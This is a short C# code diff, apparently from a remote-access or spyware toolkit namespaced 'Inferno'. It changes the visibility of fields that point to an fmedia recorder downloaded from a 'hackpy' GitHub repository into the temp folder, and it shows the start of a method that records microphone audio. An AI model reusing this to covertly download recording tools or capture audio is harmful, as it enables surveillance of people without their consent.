@@ -11,9 +11,9 @@ namespace Inferno
         // Output
         private static dynamic output = new System.Dynamic.ExpandoObject();
 
-        public static string fmediaFILE = "fmedia.exe";
-        public static string fmediaPATH = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
-        public static string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
+        private static string fmediaFILE = "fmedia.exe";
+        private static string fmediaPATH = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
+        private static string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
 
         // Record audio from microphone
         public static void Record(int time, string filename = "recording.wav")
